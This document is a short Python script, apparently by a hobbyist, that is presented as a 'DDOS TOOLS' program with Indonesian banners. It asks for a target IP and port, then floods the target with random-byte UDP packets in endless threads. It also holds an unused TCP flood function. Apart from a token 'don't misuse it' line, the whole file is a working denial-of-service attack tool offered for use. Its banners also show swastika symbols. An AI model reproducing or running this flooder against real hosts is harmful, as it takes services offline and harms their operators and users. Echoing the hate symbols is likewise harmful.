#!/usr/bin/env python3
#Code by alvaro
import random
import socket
import threading

print("~~~ DDOS TOOLS ~~~")
print("~~~ kata mamah varo ~~~")
print("~~~ Jangan disalah gunakan ~~~")
print("~~~ Script alvaro nih boss 卐 ~~~")
print("~~~ Gas keun hayyukk(stress) ~~~")

ip = str(input(" Target Ip:"))
port = int(input(" Target Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Paket yang dikirim ke target:"))
threads = int(input(" Threads yang dikirim:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Down ga? Down lah masa kaga alvaro dilawan")
		except:
			print("[!] Error tod")

def run2():
	data = random._urandom(2000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" lagi ngirim cok script by alvaro ")
		except:
			print("[!] Error aokwowkkw ")

def run3():
	data = random._urandom(3024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" lagi ngirim cok script by alvaro 卐")
		except:
			s.close()
			print("[*] Error tod")            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()